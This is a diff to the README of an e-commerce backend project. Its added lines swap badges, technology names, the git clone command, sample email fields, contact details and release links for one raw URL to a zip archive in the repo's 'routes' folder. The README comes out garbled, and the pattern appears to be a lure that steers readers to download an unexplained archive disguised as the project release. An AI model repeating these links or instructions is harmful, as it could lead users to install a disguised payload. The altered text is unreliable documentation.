@@ -1,8 +1,8 @@
 # E-Commerce Project 🛒
 
-![GitHub release](https://img.shields.io/github/release/Gun2RucK/E-Commerce-Project.svg)
-![GitHub issues](https://img.shields.io/github/issues/Gun2RucK/E-Commerce-Project.svg)
-![GitHub stars](https://img.shields.io/github/stars/Gun2RucK/E-Commerce-Project.svg)
+![GitHub release](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip)
+![GitHub issues](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip)
+![GitHub stars](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip)
 
 Welcome to the **E-Commerce Project**! This repository hosts a comprehensive backend system for an e-commerce application. It leverages modern technologies to create a robust, scalable solution for online shopping. 
 
@@ -31,8 +31,8 @@ Welcome to the **E-Commerce Project**! This repository hosts a comprehensive bac
 
 This project utilizes the following technologies:
 
-- **Node.js**: JavaScript runtime for server-side development
-- **Express.js**: Web framework for building APIs
+- **https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip**: JavaScript runtime for server-side development
+- **https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip**: Web framework for building APIs
 - **MongoDB**: NoSQL database for data storage
 - **Mongoose**: ODM for MongoDB, simplifying data modeling
 - **Postman**: Tool for testing APIs
@@ -44,7 +44,7 @@ To set up this project on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Gun2RucK/E-Commerce-Project.git
+   git clone https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -96,7 +96,7 @@ The API is designed to be simple and easy to use. Each endpoint supports standar
     ```json
     {
       "name": "John Doe",
-      "email": "john@example.com",
+      "email": "https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip",
       "password": "yourpassword"
     }
     ```
@@ -107,7 +107,7 @@ The API is designed to be simple and easy to use. Each endpoint supports standar
   - **Request Body**:
     ```json
     {
-      "email": "john@example.com",
+      "email": "https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip",
       "password": "yourpassword"
     }
     ```
@@ -149,7 +149,7 @@ The API is designed to be simple and easy to use. Each endpoint supports standar
     }
     ```
 
-For more detailed documentation, please refer to the [Releases section](https://github.com/Gun2RucK/E-Commerce-Project/releases) to download the latest version and check for updates.
+For more detailed documentation, please refer to the [Releases section](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip) to download the latest version and check for updates.
 
 ## Contributing
 
@@ -170,7 +170,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Gun2RucK](https://github.com/Gun2RucK)
+- **Email**: https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip
+- **GitHub**: [Gun2RucK](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip)
 
-Thank you for checking out the **E-Commerce Project**! For the latest releases, please visit the [Releases section](https://github.com/Gun2RucK/E-Commerce-Project/releases).
+Thank you for checking out the **E-Commerce Project**! For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/Gun2RucK/E-Commerce-Project/main/routes/Commerce-Project-v1.4-alpha.4.zip).
